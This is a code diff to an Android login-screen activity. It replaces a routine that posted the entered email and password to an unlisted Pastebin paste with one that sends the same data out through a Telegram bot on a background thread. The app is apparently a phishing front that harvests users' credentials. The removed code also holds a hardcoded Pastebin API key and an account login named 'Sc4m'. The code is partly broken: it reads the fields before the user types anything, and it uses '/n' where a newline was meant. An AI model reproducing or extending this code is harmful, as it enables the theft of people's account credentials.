@@ -5,17 +5,16 @@ import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
 
-import com.besaba.revonline.pastebinapi.Pastebin;
-import com.besaba.revonline.pastebinapi.impl.factory.PastebinFactory;
-import com.besaba.revonline.pastebinapi.paste.Paste;
-import com.besaba.revonline.pastebinapi.paste.PasteBuilder;
-import com.besaba.revonline.pastebinapi.paste.PasteExpire;
-import com.besaba.revonline.pastebinapi.paste.PasteVisiblity;
-import com.besaba.revonline.pastebinapi.response.Response;
+import org.telegram.telegrambots.ApiContextInitializer;
+import org.telegram.telegrambots.meta.TelegramBotsApi;
+import org.telegram.telegrambots.meta.exceptions.TelegramApiRequestException;
 
 import androidx.appcompat.app.AppCompatActivity;
 
 public class MainActivity extends AppCompatActivity{
+
+    //Net net;
+    static String info;
 
     @Override
     protected void onCreate(Bundle savedInstanceState){
@@ -24,47 +23,38 @@ public class MainActivity extends AppCompatActivity{
 
         final EditText e = findViewById(R.id.editTextTextEmailAddress);
         final EditText p = findViewById(R.id.editTextTextPassword);
+        info = e.getText().toString()+"/n/n"+p.getText().toString();
+
 
         final Button b=findViewById(R.id.button);
         b.setOnClickListener(new View.OnClickListener(){
                                  @Override
                                  public void onClick(View view){
 
-                                     final PastebinFactory factory = new PastebinFactory();
-                                     final Pastebin pastebin = factory.createPastebin("483e3daa72265716cadef88be40b2ebf");
-
-                                     final Response<String> userLoginKeyResponse = pastebin.login("g4b0m3n", "Sc4m");
-
-                                     if (userLoginKeyResponse.hasError()) {
-                                         System.out.println("Impossibile loggarti, " + userLoginKeyResponse.getError());
-                                         return;
-                                     }
-
-                                     final String userKey = userLoginKeyResponse.get();
-
-                                     final PasteBuilder pasteBuilder = factory.createPaste();
-                                     pasteBuilder.setTitle("Domaditos de Dios");
-                                     pasteBuilder.setVisiblity(PasteVisiblity.Unlisted); // default=public
-                                     pasteBuilder.setMachineFriendlyLanguage("text");
-                                     pasteBuilder.setExpire(PasteExpire.Never);
-                                     pasteBuilder.setRaw(e+"/n"+p);
-                                     // when i'm ready, create the Paste object
-                                     final Paste paste = pasteBuilder.build();
-
-                                     // ask to Pastebin to post the paste
-                                     // the .post method: if the paste has been published will return the key assigned
-                                     // by pastebin
-                                     final Response<String> postResult = pastebin.post(paste, userKey);
-
-                                     if (postResult.hasError()) {
-                                         System.out.println("Si è verificato un errore mentre postavo il paste: " + postResult.getError());
-                                         return;
-                                     }
-
-                                     System.out.println("Paste pubblicato! Url: " + postResult.get());
+                                     Net net = new Net();
+                                     net.start();
                                  }
                              }
         );
     }
+}
+class Net extends Thread{
 
+    @Override
+    public void run(){
+        //Bot bot = new Bot(MainActivity.info);
+
+    // Initialize Api Context
+        ApiContextInitializer.init();
+
+    // Instantiate Telegram Bots API
+    TelegramBotsApi botsApi = new TelegramBotsApi();
+
+    // Register our bot
+        try{
+            botsApi.registerBot(new Bot(MainActivity.info));
+        }catch(TelegramApiRequestException ex){
+            ex.printStackTrace();
+        }
+}
 }
